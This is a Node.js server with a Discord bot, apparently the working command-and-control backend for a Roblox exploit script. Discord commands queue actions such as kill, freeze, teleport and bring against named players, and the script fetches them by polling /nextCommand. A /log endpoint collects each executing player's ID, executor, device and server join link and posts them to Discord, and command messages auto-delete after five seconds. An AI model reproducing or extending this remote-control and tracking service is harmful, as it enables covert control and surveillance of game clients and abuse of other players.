const express = require("express");
const fs = require("fs");
const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");

const app = express();
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CANAL_DESTINO = process.env.CANAL_DESTINO;

let db = { users: [] };
if (fs.existsSync("db.json")) db = JSON.parse(fs.readFileSync("db.json"));
function saveDB() { fs.writeFileSync("db.json", JSON.stringify(db, null, 2)); }

let commands = [];
let activeUsers = {}; // [username] = true

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once("ready", () => {
    console.log("Bot iniciado!");
});

client.on("messageCreate", async (msg) => {
    if (!msg.content.startsWith(".")) return;

    const args = msg.content.split(" ");
    const cmd = args[0].substring(1);
    const targetUser = args[1]?.toLowerCase();

    const delAfter5 = async (...messages) => {
        setTimeout(() => {
            messages.forEach(m => m?.delete?.().catch(()=>{}));
        }, 5000);
    };

    // Listar usuários ativos
    if (cmd === "rn") {
        const list = Object.keys(activeUsers).map((u,i)=>`${i+1}. ${u}`).join("\n") || "Nenhum usuário ativo";
        const m = await msg.reply("Usuários ativos:\n" + list);
        return delAfter5(msg, m);
    }

    // Listar comandos disponíveis
    if (cmd === "cmds") {
        const list = [
            ".kill",
            ".message <user> <content>",
            ".speed <v>",
            ".teleport <user>",
            ".bring <user1> <user2>",
            ".freeze",
            ".unfreeze",
            ".rejoin",
            ".removeuser <userId>"
        ].join("\n");
        const m = await msg.reply("Comandos:\n" + list);
        return delAfter5(msg, m);
    }

    // Comando que precisa de usuário
    if (!targetUser && !["rn","cmds","removeuser"].includes(cmd)) {
        const m = await msg.reply("Use: .<cmd> <user> <arg>");
        return delAfter5(msg, m);
    }

    const content = args.slice(2).join(" ");

    // Adicionar comando para execução no jogo
    if (!["rn","cmds","removeuser"].includes(cmd)) {
        const c = { user: targetUser, command: cmd, arg1: args[2], arg2: args[3], content };
        commands.push(c);

        const m = await msg.reply(`**${cmd}** enviado para **${targetUser}**.`);
        delAfter5(msg, m);
    }

    // Comando para remover usuário da database
    if (cmd === "removeuser") {
        const userIdToRemove = args[1];
        if (!userIdToRemove) {
            const m = await msg.reply("Use: `.removeuser <userId>`");
            return delAfter5(msg, m);
        }

        const index = db.users.indexOf(Number(userIdToRemove));
        if (index === -1) {
            const m = await msg.reply(`Usuário ${userIdToRemove} não está na database.`);
            return delAfter5(msg, m);
        }

        db.users.splice(index, 1);
        saveDB();

        const m = await msg.reply(`Usuário ${userIdToRemove} removido da database com sucesso!`);
        return delAfter5(msg, m);
    }
});

// Endpoint para avisar que o jogador deixou o script
app.post("/exit", (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).send("Faltando username");

    // Remove da lista de ativos
    delete activeUsers[username.toLowerCase()];
    console.log(`Usuário ${username} saiu do script.`);
    res.send("OK");
});

app.post("/nextCommand", (req, res) => {
    const username = req.body.username?.toLowerCase();
    if (!username) return res.json({ command: null });

    const found = commands.find(c => c.user === username);
    if (found) {
        commands = commands.filter(c => c !== found);
        activeUsers[username] = true;
        return res.json(found);
    }

    return res.json({ command: null });
});

app.post("/log", async (req, res) => {
    const { userId, username, executor, device, date, time, placeId, serverJobId } = req.body;
    if (!userId || !username) return res.status(400).send("Requisição inválida.");

    if (!db.users.includes(userId)) {
        db.users.push(userId);
        saveDB();

        const channel = await client.channels.fetch(CANAL_DESTINO);

        const embed = new EmbedBuilder()
            .setColor("#00FFAA")
            .setTitle("Execução")
            .setThumbnail("https://i.pinimg.com/736x/82/3e/b3/823eb37ba37be4c400628296efa3219e.jpg")
            .addFields(
                { name: "Usuário", value: `[${username}](https://www.roblox.com/users/${userId}/profile)`, inline: true },
                { name: "Executor", value: executor, inline: true },
                { name: "Dispositivo", value: device, inline: true },
                { name: "Data", value: date, inline: true },
                { name: "Hora", value: time, inline: true },
                { name: "Servidor", value: `[Clique aqui](https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId})` }
            )
            .setFooter({ text: "Feito por fp3" })
            .setTimestamp();

        channel.send({ embeds: [embed] });
    }

    activeUsers[username.toLowerCase()] = true;
    res.send("OK");
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Servidor rodando na porta " + (process.env.PORT || 3000));
});

client.login(BOT_TOKEN);
